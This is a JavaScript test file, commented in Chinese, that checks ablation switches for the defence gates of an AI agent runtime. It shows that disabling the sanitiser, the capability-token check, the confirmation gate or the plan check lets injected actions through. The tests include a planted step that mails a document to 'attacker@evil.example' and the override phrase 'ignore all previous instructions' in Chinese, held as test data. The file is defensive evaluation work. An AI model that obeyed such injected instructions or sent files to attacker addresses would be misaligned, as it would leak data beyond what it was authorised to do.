'use strict';
// 单层消融：开关本身的行为测试 + harness 变体记录
const { test } = require('node:test');
const assert = require('node:assert');

const {
  ABLATIONS, ABLATION_IDS, parseAblationList, runAblations, layerById, ablationTier,
} = require('../eval/ablation.cjs');
const { CASES } = require('../eval/corpus.cjs');
const { runCase } = require('../eval/harness.cjs');
const { PolicyEngine, AuditLog, RiskMeter } = require('../src/governance.cjs');
const { CapabilityToken } = require('../src/guard.cjs');
const { AgentRuntime } = require('../src/runtime.cjs');
const { GuardedPlanner } = require('../src/planner.cjs');
const { prepareModelInput } = require('../src/model-boundary.cjs');
const { MockLLM } = require('../src/llm.cjs');
const { DOCS } = require('../src/scenario.cjs');

function mkRuntime({ disabledLayers = [], steps, token }) {
  const policy = new PolicyEngine();
  const audit = new AuditLog();
  const risk = new RiskMeter(60, { onEvent: (kind, detail) => audit.append(kind, detail) });
  const planner = {
    llm: { deployment: 'local', generate: async () => '正式稿正文' },
    makePlan: async () => ({ steps, findings: [], notes: [] }),
  };
  const rt = new AgentRuntime({ policy, audit, risk, planner, disabledLayers });
  const tk = new CapabilityToken({ issuedFor: '测试', ...token });
  return { rt, audit, tk };
}

test('消融层清单：id 唯一，解析支持 all / 子集，未知层直接报错', () => {
  assert.equal(new Set(ABLATION_IDS).size, ABLATION_IDS.length);
  assert.equal(parseAblationList('all').length, ABLATIONS.length);
  assert.deepEqual(parseAblationList('gate1,gate4').map((l) => l.id), ['gate1', 'gate4']);
  assert.throws(() => parseAblationList('gate1,nope'), /未知消融层/);
  assert.equal(ablationTier('gate2'), 'abl:gate2');
  assert.equal(layerById('gate2').id, 'gate2');
});

test('关停闸2：令牌未授权的内部邮件会被执行（默认则被闸2拒绝）', async () => {
  const steps = [{ action: 'sendInternalEmail', args: { to: 'partner@example.com', docId: 'M2' } }];
  const token = { tools: ['readDoc'], documentIds: ['M1', 'M2'] };
  const command = '把 M2 发给 partner@example.com';

  const on = mkRuntime({ steps, token });
  on.rt.knowledge.M2 = { ...DOCS.M2, sourceIds: ['M2'] };
  await on.rt.runCommand(command, { role: '员工', token: on.tk });
  assert.ok(on.audit.entries.some((e) => e.kind === '闸2拒绝'), '默认应被闸2拒绝');
  assert.equal(on.rt.outbox.length, 0);

  const off = mkRuntime({ steps, token, disabledLayers: ['gate2'] });
  off.rt.knowledge.M2 = { ...DOCS.M2, sourceIds: ['M2'] };
  await off.rt.runCommand(command, { role: '员工', token: off.tk });
  assert.ok(!off.audit.entries.some((e) => e.kind === '闸2拒绝'), '关停后不应再有闸2拒绝');
  assert.equal(off.rt.outbox.length, 1, '关停后邮件应被实际发送');
});

test('关停闸4：高危外发不再等待确认（默认近场不在线会被拒）', async () => {
  const steps = [{ action: 'sendExternalEmail', args: { to: 'a@partner.com', docId: 'M2' } }];
  const token = { tools: ['sendExternalEmail'], documentIds: ['M2'], allowedExternalDomains: ['partner.com'] };
  const command = '把 M2 发到 a@partner.com';

  const on = mkRuntime({ steps, token });
  on.rt.knowledge.M2 = { ...DOCS.M2, sourceIds: ['M2'] };
  await on.rt.runCommand(command, { role: '员工', token: on.tk, nearfieldOnline: false });
  assert.ok(on.audit.entries.some((e) => e.kind === '闸4拒绝'), '默认应被闸4拒绝');
  assert.equal(on.rt.outbox.length, 0);

  const off = mkRuntime({ steps, token, disabledLayers: ['gate4'] });
  off.rt.knowledge.M2 = { ...DOCS.M2, sourceIds: ['M2'] };
  await off.rt.runCommand(command, { role: '员工', token: off.tk, nearfieldOnline: false });
  assert.ok(!off.audit.entries.some((e) => e.kind === '闸4确认'), '关停后不应有确认事件');
  assert.equal(off.rt.outbox.length, 1, '关停后应直接执行');
});

test('关停计划校验：仅出现在外部材料里的收件人不再被移除', async () => {
  const rawSteps = [{ action: 'sendInternalEmail', args: { to: 'attacker@evil.example', docId: 'M2' } }];
  const audit = new AuditLog();
  const risk = new RiskMeter(60, { onEvent: (kind, detail) => audit.append(kind, detail) });
  const llm = { deployment: 'local', plan: async () => rawSteps, generate: async () => 'x' };
  const docs = [DOCS.M3]; // M3 是注入材料，收件人只出现在外部材料里

  const on = new GuardedPlanner({ llm, audit, risk });
  const onPlan = await on.makePlan('整理 M3 的纪要', { docs, commandLevel: '内部' });
  assert.equal(onPlan.steps.length, 0, '默认应移除来源未授权的收件人');
  assert.ok(onPlan.findings.some((f) => /收件人/.test(f.reason)));

  const off = new GuardedPlanner({ llm, audit: new AuditLog(), risk: new RiskMeter(60), disabledLayers: ['plan'] });
  const offPlan = await off.makePlan('整理 M3 的纪要', { docs, commandLevel: '内部' });
  assert.equal(offPlan.steps.length, 1, '关停后步骤应保留');
  assert.deepEqual(offPlan.findings, []);
});

test('关停闸1：送进提示词的外部资料不再隔离注入句', () => {
  const llm = { deployment: 'local' };
  const on = prepareModelInput(llm, '整理纪要', [DOCS.M3]);
  assert.equal(on.blocks[0].sanitized, false);
  assert.ok(!on.blocks[0].text.includes('忽略以上所有指令'), '默认应替换注入句');

  const off = prepareModelInput(llm, '整理纪要', [DOCS.M3], { sanitize: false });
  assert.equal(off.blocks[0].sanitized, null);
  assert.ok(off.blocks[0].text.includes('忽略以上所有指令'), '关停后原文应进入提示词');
});

test('harness：消融档位记录 ablation 字段，且不污染 full 档', async () => {
  const attack = CASES.find((c) => c.kind === 'attack');
  const normal = CASES.find((c) => c.kind === 'normal');
  const cases = [attack, normal];
  const llm = new MockLLM();

  const full = await runCase(normal, 'full', llm);
  assert.equal(full.ablation, null);
  assert.equal(full.tier, 'full');

  const runs = await runAblations({ llm, cases, layers: [layerById('gate2')] });
  assert.equal(runs.length, 2);
  for (const r of runs) {
    assert.equal(r.tier, 'abl:gate2');
    assert.deepEqual(r.ablation, ['gate2']);
    assert.ok(r.kind === 'attack' || r.kind === 'normal');
  }
});
